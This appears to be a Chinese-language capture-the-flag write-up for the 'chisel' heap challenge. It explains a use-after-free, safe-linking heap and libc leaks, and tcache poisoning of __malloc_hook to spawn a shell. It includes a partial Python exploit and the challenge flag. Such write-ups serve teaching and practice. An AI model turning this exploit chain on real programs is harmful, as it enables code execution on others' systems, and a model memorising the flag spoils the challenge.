# chisel

## 题目简述

程序只保存一个堆指针，却允许反复 `malloc`、`free`、读取和写入该指针。释放后既不清空指针，也不限制后续操作，因此同时存在 use-after-free 读取与写入。目标是在启用 glibc safe-linking 的环境中完成堆地址、libc 地址泄露和 tcache poisoning，最终获得 shell。

## 解题过程

`FREE` 分支执行 `free(chunk)` 后没有令 `chunk = NULL`，而 `EDIT` 与 `PRINT` 仍直接访问 `*chunk`。先申请并释放一个 $0x20$ 大小类的 chunk。它进入空 tcache 链表时，用户区首个机器字保存的是 safe-linking 编码后的空指针：

$$
\text{stored\_fd}=0\oplus(\text{chunk\_addr}\gg 12)
$$

因此 `PRINT` 泄露值左移 $12$ 位即可近似恢复堆基址。

接着申请大于 tcache 上限的 chunk，并调用 `Chisel` 分配一个保护块防止其与 top chunk 合并。释放大块后，它进入 unsorted bin；通过悬空指针读取其中的 `fd`，减去官方脚本给出的固定偏移即可得到所附 `libc.so.6` 的加载基址。

官方利用随后构造多个不同大小的大块并触发分割，使 $0x20$ 大小类中出现足够的可复用 chunk。再次释放小块后，用 UAF 将其 tcache `fd` 改写为：

$$
\text{encoded}=\_\_malloc\_hook\oplus(\text{heap}\gg 12)
$$

连续申请两次相同大小，第二次返回 `__malloc_hook`。向该位置写入 `system` 地址，再把 libc 中字符串 `/bin/sh` 的地址作为下一次 `malloc` 的 `size` 参数；hook 接收到该参数后等价于执行 `system("/bin/sh")`。

关键利用逻辑如下，偏移必须以题目附带的 libc 为准：

```python
alloc(24)
free()
heap = show() << 12

alloc(0x440 - 8)
chisel()
free()
libc.address = show() - 0x1e0c00

# 官方脚本在此布置大块并让分割余块补充 0x20 大小类。
alloc(24)
free()
edit((heap >> 12) ^ libc.sym["__malloc_hook"])

alloc(24)
alloc(24)
edit(libc.sym["system"])
alloc(next(libc.search(b"/bin/sh\x00")))
```

进入 shell 后读取 `flag.txt`：

```text
UMDCTF{a_glorious_statue_for_a_glorious_baron}
```

## 方法总结

本题的核心不是单次 double free，而是未清空的全局堆指针带来的稳定 UAF。空 tcache 节点泄露 safe-linking 掩码，大块进入 unsorted bin 泄露 libc，最后再用编码后的伪造 `fd` 将分配位置引向 `__malloc_hook`。利用时必须保持保护块存在，否则大块与 top chunk 合并后将失去预期的 bin 元数据。
